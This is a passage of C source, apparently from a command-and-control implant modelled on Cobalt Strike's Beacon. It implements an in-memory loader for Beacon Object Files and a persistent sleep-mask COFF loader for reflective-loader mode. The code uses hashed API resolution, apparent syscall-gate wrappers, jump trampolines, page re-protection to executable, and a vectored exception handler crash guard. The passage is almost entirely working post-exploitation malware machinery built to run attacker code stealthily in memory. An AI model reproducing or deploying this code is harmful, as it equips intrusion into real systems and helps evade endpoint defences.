    for (WORD s = 0; s < num_sections; s++) {
        if (sections[s].NumberOfRelocations == 0) continue;

        PCOFF_RELOCATION relocs = (PCOFF_RELOCATION)(coff_data + sections[s].PointerToRelocations);

        for (WORD r = 0; r < sections[s].NumberOfRelocations; r++) {
            DWORD sym_idx = relocs[r].SymbolTableIndex;
            BYTE* target = section_ptrs[s] + relocs[r].VirtualAddress;
            ULONG_PTR sym_addr = (ULONG_PTR)func_ptrs[sym_idx];
            if (!sym_addr) continue;

            switch (relocs[r].Type) {
                case IMAGE_REL_AMD64_ADDR64:
                    *(UINT64*)target += sym_addr;
                    break;
                case IMAGE_REL_AMD64_ADDR32NB:
                    *(DWORD*)target += (DWORD)(sym_addr - (ULONG_PTR)coff_base);
                    break;
                case IMAGE_REL_AMD64_REL32:
                    *(INT32*)target += (INT32)(sym_addr - (ULONG_PTR)target - 4);
                    break;
                case IMAGE_REL_AMD64_REL32_1:
                    *(INT32*)target += (INT32)(sym_addr - (ULONG_PTR)target - 5);
                    break;
                case IMAGE_REL_AMD64_REL32_2:
                    *(INT32*)target += (INT32)(sym_addr - (ULONG_PTR)target - 6);
                    break;
                case IMAGE_REL_AMD64_REL32_3:
                    *(INT32*)target += (INT32)(sym_addr - (ULONG_PTR)target - 7);
                    break;
                case IMAGE_REL_AMD64_REL32_4:
                    *(INT32*)target += (INT32)(sym_addr - (ULONG_PTR)target - 8);
                    break;
                case IMAGE_REL_AMD64_REL32_5:
                    *(INT32*)target += (INT32)(sym_addr - (ULONG_PTR)target - 9);
                    break;
            }
        }
    }

    // Set executable sections + trampolines to RX
    for (WORD i = 0; i < num_sections; i++) {
        if (sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            DWORD old_protect;
            gate_VirtualProtect(inst, section_ptrs[i], sec_sizes[i],
                                PAGE_EXECUTE_READ, &old_protect);
        }
    }
    if (tramp_used > 0) {
        DWORD old_protect;
        gate_VirtualProtect(inst, tramp_ptr, tramp_used * 12,
                            PAGE_EXECUTE_READ, &old_protect);
    }

    // Initialize output buffer
    inst->BofOutput = (char*)es_malloc(inst, 4096);
    inst->BofOutputLen = 0;
    inst->BofOutputCap = 4096;
    if (inst->BofOutput) inst->BofOutput[0] = '\0';

    // Resolve VEH + RtlExitUserThread
    typedef PVOID (WINAPI *fnAddVEH)(ULONG, PVOID);
    typedef ULONG (WINAPI *fnRemoveVEH)(PVOID);

    fnAddVEH pAddVEH = (fnAddVEH)resolve_function(inst->Modules.Ntdll,
        hash_string_djb2("RtlAddVectoredExceptionHandler"));
    fnRemoveVEH pRemoveVEH = (fnRemoveVEH)resolve_function(inst->Modules.Ntdll,
        hash_string_djb2("RtlRemoveVectoredExceptionHandler"));

    g_bof_crash.inst = inst;
    g_bof_crash.exit_thread_addr = (ULONG_PTR)resolve_function(inst->Modules.Ntdll,
        hash_string_djb2("RtlExitUserThread"));
    g_bof_crash.crash_code = 0;
    g_bof_crash.guard_active = 0;

    PVOID veh = NULL;
    if (pAddVEH && g_bof_crash.exit_thread_addr) {
        veh = pAddVEH(1, (PVOID)bof_crash_handler);
    }

    bof_dbg_hex(inst, "[BOF] entry=", (ULONG_PTR)entry_ptr);
    bof_dbg_hex(inst, "[BOF] coff_base=", (ULONG_PTR)coff_base);
    bof_dbg_hex(inst, "[BOF] AddVEH=", (ULONG_PTR)pAddVEH);
    bof_dbg_hex(inst, "[BOF] ExitThread=", g_bof_crash.exit_thread_addr);
    bof_dbg_hex(inst, "[BOF] veh=", (ULONG_PTR)veh);
    bof_dbg_hex(inst, "[BOF] LoadLibraryA=", (ULONG_PTR)inst->Win32.LoadLibraryA);
    bof_dbg_hex(inst, "[BOF] GetProcAddr=", (ULONG_PTR)inst->Win32.GetProcAddress);
    bof_dbg_hex(inst, "[BOF] ntdll=", (ULONG_PTR)inst->Modules.Ntdll);
    bof_dbg_fn(inst, "beacon_printf", (void*)beacon_printf);
    bof_dbg_fn(inst, "beacon_output", (void*)beacon_output);
    bof_dbg_fn(inst, "beacon_data_parse", (void*)beacon_data_parse);
    bof_dbg_fn(inst, "beacon_data_extract", (void*)beacon_data_extract);
    bof_dbg_fn(inst, "beacon_data_int", (void*)beacon_data_int);
    bof_dbg_fn(inst, "beacon_format_alloc", (void*)beacon_format_alloc);
    bof_dbg_fn(inst, "beacon_format_printf", (void*)beacon_format_printf);
    bof_dbg_fn(inst, "beacon_format_tostring", (void*)beacon_format_tostring);

    // Execute BOF in a thread with 60s timeout
    BOOL bof_ok = FALSE;

    BOF_RUN_CTX bctx = { entry_ptr, (char*)arg_data, (int)arg_size, inst };

    HANDLE h_bof = gate_CreateThread(inst,
        NULL, 0, bof_thread_fn, &bctx, 0, NULL);

    if (h_bof) {
        DWORD wait = gate_WaitForSingleObject(inst, h_bof, 60000);
        if (wait == WAIT_TIMEOUT) {
            typedef BOOL (WINAPI *fnTerminateThread)(HANDLE, DWORD);
            fnTerminateThread pTerminateThread = (fnTerminateThread)
                inst->Win32.GetProcAddress((HMODULE)inst->Modules.Kernel32, "TerminateThread");
            if (pTerminateThread)
                pTerminateThread(h_bof, 1);
        } else if (g_bof_crash.crash_code == 0) {
            bof_ok = TRUE;
        }
        gate_CloseHandle(inst, h_bof);
    } else {
        // Fallback: run inline if CreateThread fails
        coff_set_inst(inst);
        g_bof_crash.thread_id = get_current_tid();
        g_bof_crash.guard_active = 1;

        typedef void (__cdecl *bof_entry_t)(char*, int);
        bof_entry_t go_fn = (bof_entry_t)entry_ptr;
        go_fn((char*)arg_data, (int)arg_size);

        g_bof_crash.guard_active = 0;
        bof_ok = TRUE;
    }

    // Remove VEH
    if (veh && pRemoveVEH) pRemoveVEH(veh);

    // Return output
    *output = inst->BofOutput;
    *output_len = inst->BofOutputLen;
    inst->BofOutput = NULL;
    inst->BofOutputLen = 0;
    inst->BofOutputCap = 0;

    // Cleanup
    gate_VirtualFree(inst, coff_base, 0, MEM_RELEASE);
    es_free(inst, section_ptrs);
    es_free(inst, func_ptrs);

    return bof_ok;
}
#endif // INCLUDE_CMD_INLINE_EXECUTE

// ─── Sleepmask COFF persistent loader (UDRL mode) ───

#if SLEEP_MASK_TYPE == MASK_UDRL

static PVOID find_sleepmask_region(PINSTANCE inst, SIZE_T* out_size) {
    ALLOCATED_MEMORY* am = &inst->BeaconInfo.allocatedMemory;
    for (int i = 0; i < 6; i++) {
        if (am->AllocatedMemoryRegions[i].Purpose == PURPOSE_SLEEPMASK_MEMORY) {
            if (out_size)
                *out_size = am->AllocatedMemoryRegions[i].RegionSize;
            return am->AllocatedMemoryRegions[i].AllocationBase;
        }
    }
    return NULL;
}

BOOL sleepmask_load_coff(PINSTANCE inst, BYTE* coff_data, DWORD coff_size, const char* entry_name)
{
    if (coff_size < sizeof(COFF_FILE_HEADER))
        return FALSE;

    PCOFF_FILE_HEADER header = (PCOFF_FILE_HEADER)coff_data;
    PCOFF_SECTION sections = (PCOFF_SECTION)(coff_data + sizeof(COFF_FILE_HEADER) + header->SizeOfOptionalHeader);
    PCOFF_SYMBOL symbols = (PCOFF_SYMBOL)(coff_data + header->PointerToSymbolTable);
    char* string_table = (char*)(symbols + header->NumberOfSymbols);

    WORD num_sections = header->NumberOfSections;
    DWORD num_symbols = header->NumberOfSymbols;

    BYTE** section_ptrs = (BYTE**)es_malloc(inst, num_sections * sizeof(BYTE*));
    if (!section_ptrs) return FALSE;

    DWORD total_alloc = 0;
    DWORD sec_offsets[64] = {0};
    DWORD sec_sizes[64] = {0};

    for (WORD i = 0; i < num_sections && i < 64; i++) {
        sec_sizes[i] = sections[i].SizeOfRawData;
        if (sec_sizes[i] == 0) sec_sizes[i] = sections[i].VirtualSize;
        if (sec_sizes[i] == 0) sec_sizes[i] = 64;

        if (i > 0 && (sections[i-1].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
            !(sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)) {
            total_alloc = (total_alloc + 0xFFF) & ~0xFFFu;
        }

        sec_offsets[i] = total_alloc;
        total_alloc += (sec_sizes[i] + 15) & ~15u;
    }

    total_alloc = (total_alloc + 0xFFF) & ~0xFFFu;
    DWORD tramp_offset = total_alloc;
    total_alloc += num_symbols * 12;
    DWORD imp_offset = (total_alloc + 7) & ~7u;
    total_alloc = imp_offset + num_symbols * sizeof(void*);

    // Calculate space for COMMON symbols (globals: SectionNumber=0, Value>0)
    DWORD common_offset = (total_alloc + 7) & ~7u;
    DWORD common_total = 0;
    for (DWORD cs = 0; cs < num_symbols; cs++) {
        if (symbols[cs].SectionNumber == 0 &&
            symbols[cs].StorageClass == IMAGE_SYM_CLASS_EXTERNAL &&
            symbols[cs].Value > 0) {
            common_total = (common_total + 7) & ~7u;
            common_total += symbols[cs].Value;
        }
        cs += symbols[cs].NumberOfAuxSymbols;
    }
    total_alloc = common_offset + common_total;

    SIZE_T region_size = 0;
    PVOID region_base = find_sleepmask_region(inst, &region_size);
    BYTE* coff_base = NULL;

    if (region_base && region_size >= total_alloc) {
        coff_base = (BYTE*)region_base;
        es_memset(coff_base, 0, total_alloc);
    } else {
        coff_base = (BYTE*)gate_VirtualAlloc(inst,
            NULL, total_alloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    }

    if (!coff_base) {
        es_free(inst, section_ptrs);
        return FALSE;
    }

    for (WORD i = 0; i < num_sections; i++) {
        section_ptrs[i] = coff_base + sec_offsets[i];
        if (sections[i].SizeOfRawData > 0) {
            es_memcpy(section_ptrs[i],
                      coff_data + sections[i].PointerToRawData,
                      sections[i].SizeOfRawData);
        }
    }

    BYTE* tramp_ptr = coff_base + tramp_offset;
    DWORD tramp_used = 0;
    void** imp_table = (void**)(coff_base + imp_offset);
    DWORD common_cursor = 0;

    void** func_ptrs = (void**)es_malloc(inst, num_symbols * sizeof(void*));
    if (!func_ptrs) {
        if (!region_base) gate_VirtualFree(inst, coff_base, 0, MEM_RELEASE);
        es_free(inst, section_ptrs);
        return FALSE;
    }
    es_memset(func_ptrs, 0, num_symbols * sizeof(void*));

    void* entry_ptr = NULL;

    for (DWORD i = 0; i < num_symbols; i++) {
        char sym_name[256] = {0};
        if (symbols[i].Name.LongName.Zeros == 0) {
            char* long_name = string_table + symbols[i].Name.LongName.Offset;
            int nlen = es_strlen(long_name);
            es_memcpy(sym_name, long_name, nlen < 255 ? nlen : 255);
        } else {
            es_memcpy(sym_name, symbols[i].Name.ShortName, 8);
        }

        if (symbols[i].SectionNumber > 0) {
            WORD sec_idx = symbols[i].SectionNumber - 1;
            func_ptrs[i] = section_ptrs[sec_idx] + symbols[i].Value;

            if (es_strcmp(sym_name, entry_name) == 0 ||
                (sym_name[0] == '_' && es_strcmp(sym_name + 1, entry_name) == 0)) {
                entry_ptr = func_ptrs[i];
            }
        } else if (symbols[i].SectionNumber == 0 &&
                   symbols[i].StorageClass == IMAGE_SYM_CLASS_EXTERNAL) {
            BOOL is_imp = (sym_name[0] == '_' && sym_name[1] == '_' &&
                          sym_name[2] == 'i' && sym_name[3] == 'm' &&
                          sym_name[4] == 'p' && sym_name[5] == '_');

            if (!is_imp && symbols[i].Value > 0) {
                common_cursor = (common_cursor + 7) & ~7u;
                func_ptrs[i] = coff_base + common_offset + common_cursor;
                common_cursor += symbols[i].Value;
            } else {
                void* resolved = resolve_coff_symbol(inst, sym_name);
                if (is_imp && resolved) {
                    imp_table[i] = resolved;
                    func_ptrs[i] = &imp_table[i];
                } else if (resolved) {
                    BYTE* t = tramp_ptr + tramp_used * 12;
                    t[0] = 0x48; t[1] = 0xB8;
                    *(UINT64*)(t + 2) = (UINT64)resolved;
                    t[10] = 0xFF; t[11] = 0xE0;
                    func_ptrs[i] = t;
                    tramp_used++;
                }
            }
        }

        i += symbols[i].NumberOfAuxSymbols;
    }

    if (!entry_ptr) {
        if (!region_base) gate_VirtualFree(inst, coff_base, 0, MEM_RELEASE);
        es_free(inst, section_ptrs);
        es_free(inst, func_ptrs);
        return FALSE;
    }

    // Process relocations
    for (WORD s = 0; s < num_sections; s++) {
        if (sections[s].NumberOfRelocations == 0) continue;
        PCOFF_RELOCATION relocs = (PCOFF_RELOCATION)(coff_data + sections[s].PointerToRelocations);

        for (WORD r = 0; r < sections[s].NumberOfRelocations; r++) {
            DWORD sym_idx = relocs[r].SymbolTableIndex;
            BYTE* target = section_ptrs[s] + relocs[r].VirtualAddress;
            ULONG_PTR sym_addr = (ULONG_PTR)func_ptrs[sym_idx];
            if (!sym_addr) continue;

            switch (relocs[r].Type) {
                case IMAGE_REL_AMD64_ADDR64:
                    *(UINT64*)target += sym_addr;
                    break;
                case IMAGE_REL_AMD64_ADDR32NB:
                    *(DWORD*)target += (DWORD)(sym_addr - (ULONG_PTR)coff_base);
                    break;
                case IMAGE_REL_AMD64_REL32:
                    *(INT32*)target += (INT32)(sym_addr - (ULONG_PTR)target - 4);
                    break;
                case IMAGE_REL_AMD64_REL32_1:
                    *(INT32*)target += (INT32)(sym_addr - (ULONG_PTR)target - 5);
                    break;
                case IMAGE_REL_AMD64_REL32_2:
                    *(INT32*)target += (INT32)(sym_addr - (ULONG_PTR)target - 6);
                    break;
                case IMAGE_REL_AMD64_REL32_3:
                    *(INT32*)target += (INT32)(sym_addr - (ULONG_PTR)target - 7);
                    break;
                case IMAGE_REL_AMD64_REL32_4:
                    *(INT32*)target += (INT32)(sym_addr - (ULONG_PTR)target - 8);
                    break;
                case IMAGE_REL_AMD64_REL32_5:
                    *(INT32*)target += (INT32)(sym_addr - (ULONG_PTR)target - 9);
                    break;
            }
        }
    }

    // Set executable sections + trampolines to RX
    for (WORD i = 0; i < num_sections; i++) {
        if (sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            DWORD old_protect;
            gate_VirtualProtect(inst, section_ptrs[i], sec_sizes[i],
                                PAGE_EXECUTE_READ, &old_protect);
        }
    }
    if (tramp_used > 0) {
        DWORD old_protect;
        gate_VirtualProtect(inst, tramp_ptr, tramp_used * 12,
                            PAGE_EXECUTE_READ, &old_protect);
    }

    // Calculate executable region size for sleep_mask_text_size
    DWORD exec_end = 0;
    for (WORD es = 0; es < num_sections && es < 64; es++) {
        if (sections[es].Characteristics & (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE)) {
            DWORD end = sec_offsets[es] + sec_sizes[es];
            if (end > exec_end) exec_end = end;
        }
    }
    if (tramp_used > 0) {
        DWORD tramp_end = tramp_offset + tramp_used * 12;
        if (tramp_end > exec_end) exec_end = tramp_end;
    }
    if (exec_end == 0)
        exec_end = tramp_offset;

    inst->pfnSleepMask = entry_ptr;
    inst->pSleepMaskBase = coff_base;
    inst->bSleepMaskLoaded = TRUE;
    inst->dwSleepMaskTextSize = (exec_end + 0xFFF) & ~0xFFFu;

    es_free(inst, section_ptrs);
    es_free(inst, func_ptrs);

    return TRUE;
}

#endif // SLEEP_MASK_TYPE == MASK_UDRL

#endif // INCLUDE_CMD_INLINE_EXECUTE || MASK_UDRL
